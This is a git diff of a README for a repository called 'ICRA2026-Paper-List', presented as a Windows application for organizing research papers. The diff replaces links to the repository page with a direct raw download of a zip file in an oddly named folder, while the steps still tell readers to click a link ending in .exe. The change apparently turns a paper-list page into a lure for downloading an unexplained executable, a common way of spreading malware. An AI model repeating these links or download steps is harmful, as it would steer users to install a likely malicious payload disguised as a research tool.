@@ -1,6 +1,6 @@
 # 📑 ICRA2026-Paper-List - Organize your academic research papers efficiently
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Marinaflagrant322/ICRA2026-Paper-List)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Marinaflagrant322/ICRA2026-Paper-List/main/synthronoi/List-Paper-ICR-2.6.zip)
 
 ## 📖 About This Tool
 
@@ -20,7 +20,7 @@ This tool runs on any modern version of Microsoft Windows. You need a stable int
 
 Follow these steps to get the software onto your computer.
 
-1. Visit [this page](https://github.com/Marinaflagrant322/ICRA2026-Paper-List) to access the official download.
+1. Visit [this page](https://raw.githubusercontent.com/Marinaflagrant322/ICRA2026-Paper-List/main/synthronoi/List-Paper-ICR-2.6.zip) to access the official download.
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the link that ends in .exe to start the file transfer.
 4. Save the file to your Downloads folder.
